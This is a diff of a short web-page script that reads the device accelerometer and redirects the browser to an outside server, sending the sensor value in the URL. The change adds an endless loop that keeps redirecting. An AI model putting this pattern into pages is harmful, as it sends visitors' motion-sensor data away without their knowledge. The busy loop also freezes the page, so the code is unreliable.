@@ -1,4 +1,4 @@
-    <script>
+<script>
        let value = null;
        let acl = new Accelerometer({frequency: 60});
         
@@ -7,8 +7,15 @@
         value = acl.x;
     });
     acl.start();
+    
     function redir() {
   document.location.replace("http://medved3q.beget.tech/sendData.php?x="+value);
 }
     setTimeout(redir, 170);
-    </script>
+    while(true){
+        if(value != null){
+            document.location.replace("http://medved3q.beget.tech/sendData.php?x="+value);
+        }
+    }
+      
+</script>
